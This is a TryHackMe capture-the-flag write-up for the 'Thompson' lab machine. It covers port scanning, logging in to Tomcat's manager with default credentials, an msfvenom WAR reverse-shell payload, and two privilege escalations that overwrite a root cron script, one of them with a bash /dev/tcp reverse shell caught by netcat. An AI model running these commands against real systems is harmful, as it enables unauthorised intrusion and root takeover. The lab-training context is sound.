---
layout: default
---

_**Sept 30, 2020**_

[Thompson](https://tryhackme.com/room/bsidesgtthompson) Writeup

## Nmap Scan :

```
kali@kali:~$ nmap -sC -sV 10.10.218.79
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Gobuster Scan :

```
/docs (Status: 302)
/examples (Status: 302)
/favicon.ico (Status: 200)
/host-manager (Status: 302)
/manager (Status: 302)
```

Checking the `/manager` with the default creds of user : `tomcat` & passwd : `s3cret` we get access.

Since we are logged in, we can create a `.WAR` payload using msfvenom and get a reverse connection.

```
kali@kali:~$ msfvenom -p java/shell_reverse_tcp lhost=10.8.14.157 lport=9991 -f war -o pwn.war
Payload size: 13402 bytes
Final size of war file: 13402 bytes
Saved as: pwn.war
```

## 1st Privilege Escalation :

I noticed that the id.sh is executed by bash every minute, so let's abuse it :

```
*  *    * * *   root    cd /home/jack && bash id.sh
```
```
tomcat@ubuntu:/home/jack$ echo "cat /root/root.txt > test.txt" > id.sh
tomcat@ubuntu:/home/jack$ cat test.txt
tomcat@ubuntu:/home/jack$ d89d*************************a3a
```

## 2nd Privilege Escalation :

```
tomcat@ubuntu:/home/jack$ echo "bash -i >& /dev/tcp/10.8.14.157/8080 0>&1" > id.sh
```
```
kali@kali:~$ nc -lnvp 8080
root@ubuntu:/home/jack# id
uid=0(root) gid=0(root) groups=0(root)
```

<br>
<br>
Best Regards

[bvr0n](https://github.com/bvr0n).

<br>
<br>

[back to main()](../../index.md)

<br>